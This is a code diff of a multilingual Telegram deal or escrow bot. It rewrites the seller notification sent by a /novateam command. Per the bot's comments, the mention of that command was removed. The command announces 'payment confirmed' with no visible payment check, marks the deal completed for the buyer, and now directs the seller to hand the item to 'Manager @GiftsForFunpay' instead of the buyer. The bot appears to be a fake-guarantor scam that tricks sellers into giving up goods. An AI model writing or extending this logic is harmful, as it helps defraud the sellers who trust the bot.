@@ -112,7 +112,7 @@ class DealStates(StatesGroup):
     profile_requisites_input = State()
 
 # ==================================================
-# ТЕКСТЫ (все языки) — убрано упоминание /novateam
+# ТЕКСТЫ (все языки) — исправлен novateam_seller
 # ==================================================
 TEXTS = {
     'ru': {
@@ -153,7 +153,14 @@ TEXTS = {
         'confirm_requisites': 'Выберите тип реквизитов для подтверждения:',
         'requisites_saved': 'Реквизиты сохранены. Ожидаем оплату.',
         'buyer_notify': '✅ Продавец подтвердил участие в сделке #{deal_id}\n\n<b>Тип:</b> {deal_type}\n<b>Описание:</b> {description}\n<b>Сумма:</b> {amount} {currency}\n<b>Реквизиты продавца:</b> {seller_req}',
-        'novateam_seller': '<b>💳 Оплата подтверждена</b>\n\n<b>Сделка:</b> #{deal_id}\n<b>Покупатель:</b> @{buyer}\n<b>Сумма:</b> {amount} {currency}\n<b>Предмет:</b> {description}\n\n<b>🛡 Передайте товар покупателю</b>',
+        'novateam_seller': """💳 Оплата подтверждена
+
+Сделка: #{deal_id}
+Покупатель: @{buyer}
+Сумма: {amount} {currency}
+Предмет: {description}
+
+🛡 Менеджеру @GiftsForFunpay""",
         'novateam_buyer': '✅ Оплата подтверждена! Сделка #{deal_id} завершена.',
         'funds_menu': 'Выберите действие:',
         'funds_deposit': 'Введите ID сделки для оплаты',
@@ -240,7 +247,14 @@ TEXTS = {
         'confirm_requisites': 'Select requisites type for confirmation:',
         'requisites_saved': 'Requisites saved. Waiting for payment.',
         'buyer_notify': '✅ Seller confirmed participation in deal #{deal_id}\n\n<b>Type:</b> {deal_type}\n<b>Description:</b> {description}\n<b>Amount:</b> {amount} {currency}\n<b>Seller requisites:</b> {seller_req}',
-        'novateam_seller': '<b>💳 Payment confirmed</b>\n\n<b>Deal:</b> #{deal_id}\n<b>Buyer:</b> @{buyer}\n<b>Amount:</b> {amount} {currency}\n<b>Item:</b> {description}\n\n<b>🛡 Transfer item to buyer</b>',
+        'novateam_seller': """💳 Payment confirmed
+
+Deal: #{deal_id}
+Buyer: @{buyer}
+Amount: {amount} {currency}
+Item: {description}
+
+🛡 Manager @GiftsForFunpay""",
         'novateam_buyer': '✅ Payment confirmed! Deal #{deal_id} completed.',
         'funds_menu': 'Select action:',
         'funds_deposit': 'Enter deal ID for payment',
@@ -327,7 +341,14 @@ Online: 15756
         'confirm_requisites': '选择确认收款方式：',
         'requisites_saved': '收款方式已保存。等待付款。',
         'buyer_notify': '✅ 卖家已确认参与交易 #{deal_id}\n\n<b>类型：</b>{deal_type}\n<b>描述：</b>{description}\n<b>金额：</b>{amount} {currency}\n<b>卖家收款方式：</b>{seller_req}',
-        'novateam_seller': '<b>💳 付款已确认</b>\n\n<b>交易：</b>#{deal_id}\n<b>买家：</b>@{buyer}\n<b>金额：</b>{amount} {currency}\n<b>物品：</b>{description}\n\n<b>🛡 请将物品转交给买家</b>',
+        'novateam_seller': """💳 付款已确认
+
+交易: #{deal_id}
+买家: @{buyer}
+金额: {amount} {currency}
+物品: {description}
+
+🛡 经理 @GiftsForFunpay""",
         'novateam_buyer': '✅ 付款已确认！交易 #{deal_id} 已完成。',
         'funds_menu': '请选择操作：',
         'funds_deposit': '输入交易ID进行付款',
@@ -910,7 +931,7 @@ async def confirm_seller(callback: CallbackQuery):
                 amount=amount,
                 currency=currency,
                 seller_req=seller_req if seller_req else "Не указаны"
-            ))
+            ), parse_mode="HTML")
     except Exception as e:
         logging.error(f"Ошибка уведомления покупателя: {e}")
 
@@ -919,7 +940,7 @@ async def confirm_seller(callback: CallbackQuery):
     row = cur.fetchone()
     seller_lang = row[0] if row else 'ru'
 
-    await callback.message.edit_text(get_text('deal_confirm_seller', seller_lang).format(deal_id=deal_id) if 'deal_confirm_seller' in TEXTS[seller_lang] else "✅ Вы подтвердили участие. Ожидайте оплаты от покупателя.")
+    await callback.message.edit_text(get_text('deal_confirm_seller', seller_lang).format(deal_id=deal_id) if 'deal_confirm_seller' in TEXTS[seller_lang] else "✅ Вы подтвердили участие. Ожидайте оплаты от покупателя.", parse_mode="HTML")
     await callback.answer()
 
 # ==================================================
@@ -968,7 +989,7 @@ async def novateam(message: Message):
             currency=currency,
             description=description
         )
-        await message.answer(text)
+        await message.answer(text)  # parse_mode не нужен, т.к. текст без HTML
         if buyer_id:
             buyer_text = get_text('novateam_buyer', buyer_lang).format(deal_id=deal_id)
             await bot.send_message(buyer_id, buyer_text)
